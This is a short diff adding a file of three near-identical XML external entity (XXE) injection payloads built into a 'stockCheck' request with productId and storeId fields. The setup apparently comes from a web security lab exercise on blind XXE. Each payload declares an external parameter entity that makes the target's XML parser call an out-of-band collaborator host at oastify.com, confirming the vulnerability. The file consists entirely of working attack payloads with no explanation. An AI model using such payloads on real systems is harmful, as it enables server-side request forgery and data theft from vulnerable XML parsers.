@@ -1,0 +1,10 @@
+
+
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://vmlf7hrf1ms0ow0l89enp43dx43vrnfc.oastify.com"> %xxe; ]>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://vmlf7hrf1ms0ow0l89enp43dx43vrnfc.oastify.com"> %xxe; ]><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
+
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://vmlf7hrf1ms0ow0l89enp43dx43vrnfc.oastify.com"> %xxe; ]><stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
